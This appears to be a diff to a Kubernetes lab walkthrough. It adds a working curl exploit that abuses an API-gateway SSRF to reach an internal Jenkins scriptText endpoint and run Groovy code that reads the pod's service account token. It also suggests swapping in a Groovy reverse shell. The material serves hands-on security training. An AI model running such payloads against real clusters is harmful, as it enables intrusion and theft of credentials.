@@ -38,13 +38,17 @@ For this one we are looking for indications that the backend is trying to resolv
 
 ## Hit the jenkins service through SSRF
 ```
-curl http://localhost:31337 -H "X-Original-Host: http://jenkinssvc:8080"
+curl http://localhost:31337/api -H "X-Original-Host: http://jenkinssvc:8080"
 ```
 
 We should see a resonse which is the Jenkins dashboard comeback. Indicating that we were able to hit a internal Jenkins service via the API gateway SSRF.
 
 # Exploit the access to Jenkins
 To do this we can use the raw HTTP request which is found in the file `k8s-labs/payloads/jenkinsexploit.http`. This is just a convenience to exploit the `scriptText` endpoint which Jenkins has enabled by default. This particular payload will exfiltrate the Jenkins containers kubernetes secret for us, which we can then use with `kubectl` to further expand our access to the cluster.
+
+```
+curl -XPOST http://localhost:31337/api -H 'X-Original-Host: http://jenkinssvc:8080/scriptText?script=def+command+%3d+"cat+/var/run/secrets/kubernetes.io/serviceaccount/token"%3bdef+proc+%3d+command.execute()%3bproc.waitFor()%3bprintln+"${proc.in.text}"%3b%2f%2f'
+```
 
 You could also use a different Groovy payload here, such as a reverse shell to gain a shell into the Jenkins container, and go from there. Try it out!
 
